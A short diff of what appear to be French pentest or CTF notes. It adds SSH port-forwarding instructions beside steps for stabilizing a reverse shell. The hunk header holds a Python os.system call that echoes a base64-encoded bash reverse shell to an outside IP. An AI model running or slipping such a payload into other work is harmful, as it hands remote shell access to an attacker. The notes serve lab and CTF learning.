@@ -208,6 +208,14 @@ __import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNy4yNT
 - 2.2.b sur BASH `stty raw -echo` <enter> puis `fg`
 - 2.3. dans le revshell, export de la variable TERM avec `export TERM=xterm`
 - 2.4. on se fait plaiz avec `alias ll="ls -alh --color"` et `alias grep="grep --color=always"` dans le revshell
+
+# Port Forward :
+Port forwarding avec ssh
+ - ssh -L 9999:127.0.0.1:8000 Username@TargetIP
+    Port local : 9999
+    Port a rediriger 8000
+    
+
   
   
  # Write-up
